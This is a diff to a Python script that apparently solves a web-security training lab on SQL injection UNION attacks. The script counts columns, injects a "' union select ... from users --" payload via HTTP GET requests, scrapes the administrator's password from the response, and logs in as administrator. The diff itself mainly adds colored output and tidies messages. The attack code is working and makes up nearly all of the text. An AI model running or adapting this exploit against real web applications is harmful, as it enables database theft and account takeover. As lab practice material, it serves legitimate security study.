@@ -1,8 +1,19 @@
+#problem statement -> SQL injection UNION attack, retrieving multiple values in a single column
+
 import requests 
 import sys
 import urllib3
 from bs4 import BeautifulSoup
 import re
+from colorama import Fore , Back , Style , init
+
+#Defining colors
+#init(autoreset=True)
+magenta = Fore.MAGENTA
+bright = Style.BRIGHT
+reset = Style.RESET_ALL
+print(bright,magenta)
+
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -42,10 +53,10 @@ def admin_password(url,column_list,ncolumn):
                 payload = "' union select "+",".join(payload_list)+" from users"+" --"
                 res = requests.get(url+path+payload,proxies=proxy,verify=False)
                 if "administrator" in res.text:
-                        print("Administrator found.......")
+                        print("[+] Administrator found.......")
                         soup = BeautifulSoup(res.text,'html.parser')
                         password = soup.find(string=re.compile('.*administrator.*')).split('*')[1]
-                        print("password= "+password)
+                        print("[+] Administrator password = "+password)
     return password
 
 def login(url,administrator_password):
@@ -72,13 +83,17 @@ if __name__=="__main__":
     except IndexError:
         print("[+] Usage : python3 {} <url>".format(sys.argv[0]))
         print("[+] Example : python3 {} <url>".format(sys.argv[0]))
+        sys.exit(-1)
+
 
     print("[+] Figuring Number of columns.......")
     ncolumn = numberof_column(url)
-    print("Number Of Columns = ",ncolumn)
+    print("[+] Number Of Columns = ",ncolumn)
     column_list = columnof_str_datatype(url,ncolumn)
     administrator_password = admin_password(url,column_list,ncolumn)
-    print("Attemptig to log in")
+    print("[+] Attempting to log in")
     check = login(url,administrator_password)
     if check:
          print("********* Lab Solved *************")
+
+print(reset)
